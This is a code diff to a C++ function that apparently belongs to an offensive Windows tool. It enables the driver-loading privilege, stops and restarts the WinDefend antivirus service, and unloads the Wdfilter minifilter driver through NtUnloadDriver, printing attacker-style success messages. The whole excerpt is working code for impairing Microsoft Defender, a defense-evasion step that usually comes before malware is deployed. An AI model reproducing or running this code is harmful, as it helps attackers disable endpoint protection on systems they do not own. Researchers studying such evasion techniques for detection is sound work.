@@ -112,13 +112,43 @@ NTSTATUS ImpersonateAndUnload()
 	success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
 	if (!success) return 1;
 
+	RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
+	if (!winDefendSvc.GetHandle())
+	{
+		Error(GetLastError());
+		std::cout << "[-] Couldn't get a handle to the WinDefend service...\n";
+		return 1;
+	}
+	else std::cout << "[+] Opened handle to the WinDefend service!\n";
+
+	SERVICE_STATUS svcStatus;
+	success = ControlService(winDefendSvc.GetHandle(), SERVICE_CONTROL_STOP, &svcStatus);
+	if (!success)
+	{
+		Error(GetLastError());
+		std::cout << "[-] Couldn't stop WinDefend service...\n";
+		return 1;
+	}
+	else std::cout << "[+] Successfully stopped the WinDefend service! Proceeding to restart it...\n";
+
+	Sleep(10000);
+
+	success = StartServiceW(winDefendSvc.GetHandle(), 0, nullptr);
+	if (!success)
+	{
+		Error(GetLastError());
+		std::cout << "[-] Couldn't restart WinDefend service...\n";
+		return 1;
+	}
+	else std::cout << "[+] Successfully restarted the WinDefend service!\n";
+
 	UNICODE_STRING wdfilterDrivServ;
 	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
+
 	status = NtUnloadDriver(&wdfilterDrivServ);
 	if (status == STATUS_SUCCESS) 
 	{
-		std::cout << "[+] Successfully unloaded Wdfilter! Waiting 50 seconds...\n";
-		Sleep(50000);
+		std::cout << "[+] Successfully unloaded Wdfilter!\n";
 	}
 	else
 	{
